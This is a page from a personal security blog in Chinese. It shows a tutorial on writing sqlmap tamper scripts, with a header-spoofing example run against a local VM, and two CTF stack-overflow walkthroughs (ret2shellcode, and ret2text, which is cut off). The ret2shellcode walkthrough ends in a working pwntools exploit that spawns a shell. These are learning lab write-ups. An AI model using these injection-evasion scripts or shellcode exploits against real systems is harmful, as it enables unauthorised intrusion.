<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>thedarknessdied</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="记录美好的生活">
<meta property="og:type" content="website">
<meta property="og:title" content="thedarknessdied">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="thedarknessdied">
<meta property="og:description" content="记录美好的生活">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="R0seK1llere">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="thedarknessdied" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">thedarknessdied</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">R0seK1ller</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-tools-sqlmap-script-build" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/21/tools-sqlmap-script-build/" class="article-date">
  <time class="dt-published" datetime="2024-03-20T16:49:32.000Z" itemprop="datePublished">2024-03-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/21/tools-sqlmap-script-build/">tools-sqlmap-script-build</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SQLMAP-tamper-的编写"><a href="#SQLMAP-tamper-的编写" class="headerlink" title="SQLMAP tamper 的编写"></a>SQLMAP tamper 的编写</h1><h2 id="0-关于-sqlmap-的-tamper"><a href="#0-关于-sqlmap-的-tamper" class="headerlink" title="0. 关于 sqlmap 的 tamper"></a>0. 关于 sqlmap 的 tamper</h2><p>​	在sqlmap的目录下，可以看到一个名字为tamper的文件，这个文件中，存放着sqlmap自带的脚本，我们也可以在其中创建自己的脚本，然后去针对不同的网站进行不同的绕过策略。我们通过对脚本的编写，可以修改sqlmap在攻击时所使用的payload或修改Header的值来进行更有针对性的攻击。</p>
<h2 id="1-标准-tamper-脚本结构"><a href="#1-标准-tamper-脚本结构" class="headerlink" title="1. 标准 tamper 脚本结构"></a>1. 标准 tamper 脚本结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &#x27;doc/COPYING&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"># 当前脚本调用优先等级</span><br><span class="line">__priority__ = PRIORITY.LOW </span><br><span class="line"></span><br><span class="line"># 声明当前脚本适用/不适用的范围，可以为空。</span><br><span class="line">def dependencies(): </span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line"># 用于篡改Payload、以及请求头的主要函数</span><br><span class="line">def tamper(payload, **kwargs): </span><br><span class="line">  return payload</span><br></pre></td></tr></table></figure>

<h3 id="1-1-重要部分解析"><a href="#1-1-重要部分解析" class="headerlink" title="1.1 重要部分解析"></a>1.1 重要部分解析</h3><h4 id="1-1-1-priority-Param"><a href="#1-1-1-priority-Param" class="headerlink" title="1.1.1 priority [Param]"></a>1.1.1 priority [Param]</h4><p>​	priority定义脚本的优先级，用于在测试过程中选用多个tamper脚本的情况下测试的先后顺序。谁的优先级高，谁被优先使用。（优先级共有七个，分别为；LOWEST、LOWER、LOW、NORMAL、HIGH、HIGHER、HIGHEST）</p>
<h4 id="1-1-2-dependencies-Fuction"><a href="#1-1-2-dependencies-Fuction" class="headerlink" title="1.1.2 dependencies [Fuction]"></a>1.1.2 dependencies [Fuction]</h4><p>​	dependencies函数声明该脚本适用&#x2F;不适用的范围，可以为空。</p>
<h4 id="1-1-3-tamper-Fuction"><a href="#1-1-3-tamper-Fuction" class="headerlink" title="1.1.3 tamper [Fuction]"></a>1.1.3 tamper [Fuction]</h4><p>​	tamper是主要的函数，接受的参数为payload和**kwargs，返回值为替换后的payload。</p>
<p>​	payload 拼接查询语句</p>
<p>​	**kwargs 存储的是 HTTP REQUEST 请求头中的内容， 多数存储在 kwargs[‘headers’] 中</p>
<h2 id="2-编写测试脚本并验证"><a href="#2-编写测试脚本并验证" class="headerlink" title="2. 编写测试脚本并验证"></a>2. 编写测试脚本并验证</h2><h3 id="2-1-开启HTTP服务"><a href="#2-1-开启HTTP服务" class="headerlink" title="2.1 开启HTTP服务"></a>2.1 开启HTTP服务</h3><p>​	在虚拟机中开启 HTTP 服务，模拟存在SQL注入的web服务</p>
<p><img src="/images/image-20240321003450311.png" alt="image-20240321003450311"></p>
<h3 id="2-2-编写测试脚本"><a href="#2-2-编写测试脚本" class="headerlink" title="2.2 编写测试脚本"></a>2.2 编写测试脚本</h3><p>​	我们尝试在每次发送的请求URL最后都加上fregment，其内容为”#just-for-test”，并设置请求头headers中”X-Forwarded-For”字段的数值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># self2test.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> kwargs[<span class="string">&#x27;headers&#x27;</span>].get(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> kwargs[<span class="string">&#x27;headers&#x27;</span>].get(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">        kwargs[<span class="string">&#x27;headers&#x27;</span>].setdefault(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        kwargs[<span class="string">&#x27;headers&#x27;</span>][<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;8.8.8.8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;#just-for-test&quot;</span>.<span class="built_in">format</span>(payload) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-3-BurpSuite-抓包监听"><a href="#2-3-BurpSuite-抓包监听" class="headerlink" title="2.3 BurpSuite 抓包监听"></a>2.3 BurpSuite 抓包监听</h3><p>​	设置 Bp 监听本地8080端口</p>
<h3 id="2-4-运行脚本"><a href="#2-4-运行脚本" class="headerlink" title="2.4 运行脚本"></a>2.4 运行脚本</h3><blockquote>
<p>python sqlmap.py –proxy&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> –tamper&#x3D;self2test -u “<a target="_blank" rel="noopener" href="http://192.168.70.196:8000/?id=1">http://192.168.70.196:8000/?id=1</a>*”</p>
</blockquote>
<p>​	使用--proxy参数指定代理地址为<a href="http://127.0.0.1:8080，将流量转发到BurpSuite上方便观察">http://127.0.0.1:8080，将流量转发到BurpSuite上方便观察</a></p>
<p><img src="/images/image-20240321004123079.png" alt="image-20240321004123079"></p>
<p>​	在流量包的数据中我们可以很清楚的看见URL中多出了个内容为”#just-for-test”的fregment，并且在请求头headers中”X-Forwarded-For”字段的数值也被设置了</p>
<p><img src="/images/image-20240321004443797.png" alt="image-20240321004443797"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/21/tools-sqlmap-script-build/" data-id="clu6lf1h0000ha2vde9qd2l45" data-title="tools-sqlmap-script-build" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-pwn-stackoverflow-ret2shellcode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/20/pwn-stackoverflow-ret2shellcode/" class="article-date">
  <time class="dt-published" datetime="2024-03-20T12:58:10.000Z" itemprop="datePublished">2024-03-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/20/pwn-stackoverflow-ret2shellcode/">pwn-stackoverflow-ret2shellcode</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[toc]</p>
<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="0-基础准备"><a href="#0-基础准备" class="headerlink" title="0 基础准备"></a>0 基础准备</h2><h3 id="0-1-ret2shellcode原理"><a href="#0-1-ret2shellcode原理" class="headerlink" title="0.1 ret2shellcode原理"></a>0.1 ret2shellcode原理</h3><p>​	ret2shellcode控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。</p>
<h3 id="0-2-环境"><a href="#0-2-环境" class="headerlink" title="0.2 环境"></a>0.2 环境</h3><p>​	测试程序点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
<h2 id="1-初步审计"><a href="#1-初步审计" class="headerlink" title="1 初步审计"></a>1 初步审计</h2><h3 id="1-1-保护机制检测"><a href="#1-1-保护机制检测" class="headerlink" title="1.1 保护机制检测"></a>1.1 保护机制检测</h3><p>​	首先，查看一下程序的保护机制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  checksec ret2shellcode</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h3 id="1-2-源码观察"><a href="#1-2-源码观察" class="headerlink" title="1.2 源码观察"></a>1.2 源码观察</h3><p>​	通过观察源程序可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="type">const</span> <span class="type">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	这里的代码与ret2text差不多相同，不过这次还同时将对应的字符串复制到 buf2 处</p>
<h3 id="1-3-逆向分析"><a href="#1-3-逆向分析" class="headerlink" title="1.3 逆向分析"></a>1.3 逆向分析</h3><p>​	简单查看可知 buf2 在 bss 段</p>
<blockquote>
<p>.bss:0804A080                 public buf2<br>.bss:0804A080 ; char buf2[100]</p>
</blockquote>
<p>​	gdb 调试程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8	ret2shellcode.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────</span><br><span class="line"> EAX  0xf7fb9dbc (environ) —▸ 0xffffd59c —▸ 0xffffd70d ◂— 0x505f434c (&#x27;LC_P&#x27;)</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xaebb06ec</span><br><span class="line"> EDX  0xffffd524 ◂— 0x0</span><br><span class="line"> EDI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */</span><br><span class="line"> ESI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */</span><br><span class="line"> EBP  0xffffd4f8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd470 —▸ 0xffffd49e —▸ 0xffff0000 ◂— 0x0</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov    eax, dword ptr [0x804a060]</span><br><span class="line">────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">gef➤  vmmap </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line">0xf7e04000 0xf7e05000 rwxp     1000 0      </span><br><span class="line">0xf7e05000 0xf7fb5000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb5000 0xf7fb6000 ---p     1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb6000 0xf7fb8000 r-xp     2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb8000 0xf7fb9000 rwxp     1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb9000 0xf7fbc000 rwxp     3000 0      </span><br><span class="line">0xf7fd4000 0xf7fd5000 rwxp     1000 0      </span><br><span class="line">0xf7fd5000 0xf7fd7000 r--p     2000 0      [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 22000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 23000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br><span class="line">6-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure>

<p>​	因为buf2所在的内存地址为0x0804A080 ,处于[0x0804a000, 0x0804b000)区间内，所以这个区间就是 BSS 段在内存中的位置</p>
<blockquote>
<p>0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;richard&#x2F;Desktop&#x2F;demo1&#x2F;ret2shellcode</p>
</blockquote>
<p><strong>注意：如果观察到bss段不存在执行权限，可能是当前系统版本太高(在这里我使用的是ubuntu16.04)</strong></p>
<p><img src="/images/image-20240320204423628.png" alt="image-20240320204423628"></p>
<h2 id="2-确定偏移量"><a href="#2-确定偏移量" class="headerlink" title="2 确定偏移量"></a>2 确定偏移量</h2><h3 id="2-1-溢出报错确定偏移量"><a href="#2-1-溢出报错确定偏移量" class="headerlink" title="2.1 溢出报错确定偏移量"></a>2.1 溢出报错确定偏移量</h3><p>​	在 GDB 中，首先使用 pwndbg 的 cyclic 插件生成 200 个有序字符</p>
<blockquote>
<p>cyclic 200</p>
</blockquote>
<p><img src="/images/image-20240320205025701.png" alt="image-20240320205025701"></p>
<p>​	然后运行程序至输入口，将生成的有序字符串作为 stdin 数据输入运行程序</p>
<p><img src="/images/image-20240320205040321.png" alt="image-20240320205040321"></p>
<p>​	继续运行程序，可以发现程序出错了，在0x62616164这个地址处出现错误，函数调用结束后会使用 ret 从栈中弹出一个数值作为 EIP 的数值，从而将下一条执行命令的地址修改为 EIP指向地址</p>
<p><img src="/images/image-20240320205103128.png" alt="image-20240320205103128"></p>
<p>​	然后使用 pwndbg 的 <code>cyclic -l</code>  查看在出错的字符前还有多少个字节的数据，可以看到在当前出错的数据前还有112个字符数据</p>
<blockquote>
<p>cyclic -l 0x62616164</p>
</blockquote>
<p><img src="/images/image-20240320173215041.png" alt="image-20240320173215041"></p>
<h2 id="3-梳理逻辑，编写程序"><a href="#3-梳理逻辑，编写程序" class="headerlink" title="3 梳理逻辑，编写程序"></a>3 梳理逻辑，编写程序</h2><p>​	ret2shellcode，自己将shellcode写入可执行区域并执行</p>
<p>​	所以我们需要输入这样一串字符：</p>
<ul>
<li><p>构建shell的汇编指令</p>
</li>
<li><p>112个字符数据(包括第一步构建的shell汇编指令和垃圾数据)</p>
</li>
<li><p>.bss:0x804a080内存地址</p>
<p>最后的 payload 如下：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2shellcode/" data-id="clu6lf1gn0005a2vdaguea0x2" data-title="pwn-stackoverflow-ret2shellcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-pwn-stackoverflow-ret2text" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/20/pwn-stackoverflow-ret2text/" class="article-date">
  <time class="dt-published" datetime="2024-03-20T11:10:13.000Z" itemprop="datePublished">2024-03-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/20/pwn-stackoverflow-ret2text/">pwn-stackoverflow-ret2text</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[toc]</p>
<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="0-基础准备"><a href="#0-基础准备" class="headerlink" title="0 基础准备"></a>0 基础准备</h2><h3 id="0-1-ret2text-原理"><a href="#0-1-ret2text-原理" class="headerlink" title="0.1 ret2text 原理"></a>0.1 ret2text 原理</h3><p>​	ret2text 即控制程序执行程序本身已有的的代码 (.text)</p>
<h3 id="0-2-环境"><a href="#0-2-环境" class="headerlink" title="0.2 环境"></a>0.2 环境</h3><p>​	测试程序点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
<h2 id="1-初步审计"><a href="#1-初步审计" class="headerlink" title="1 初步审计"></a>1 初步审计</h2><h3 id="1-1-保护机制检测"><a href="#1-1-保护机制检测" class="headerlink" title="1.1 保护机制检测"></a>1.1 保护机制检测</h3><p>​	首先，查看一下程序的保护机制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  checksec ret2text</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h3 id="1-2-源码观察"><a href="#1-2-源码观察" class="headerlink" title="1.2 源码观察"></a>1.2 源码观察</h3><p>​	通过观察源程序可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-逆向分析"><a href="#1-3-逆向分析" class="headerlink" title="1.3 逆向分析"></a>1.3 逆向分析</h3><p>​	又发现：</p>
<p>​		在程序的 .text:0804863A 处 存在字符串”&#x2F;bin&#x2F;bash”,</p>
<p>​		在程序的 .text:08048641 处 存在system的函数调用,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:080485FD secure          proc near</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD input           = dword ptr -10h</span><br><span class="line">.text:080485FD secretcode      = dword ptr -0Ch</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD                 push    ebp</span><br><span class="line">.text:080485FE                 mov     ebp, esp</span><br><span class="line">.text:08048600                 sub     esp, 28h</span><br><span class="line">.text:08048603                 mov     dword ptr [esp], 0 ; timer</span><br><span class="line">.text:0804860A                 call    _time</span><br><span class="line">.text:0804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:08048612                 call    _srand</span><br><span class="line">.text:08048617                 call    _rand</span><br><span class="line">.text:0804861C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:0804861F                 lea     eax, [ebp+input]</span><br><span class="line">.text:08048622                 mov     [esp+4], eax</span><br><span class="line">.text:08048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:08048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638                 jnz     short locret_8048646</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure>



<h2 id="2-确定偏移量"><a href="#2-确定偏移量" class="headerlink" title="2 确定偏移量"></a>2 确定偏移量</h2><h3 id="2-1-溢出报错确定偏移量"><a href="#2-1-溢出报错确定偏移量" class="headerlink" title="2.1 溢出报错确定偏移量"></a>2.1 溢出报错确定偏移量</h3><p>​	在 GDB 中，首先使用 pwndbg 的 cyclic 插件生成 200 个有序字符</p>
<blockquote>
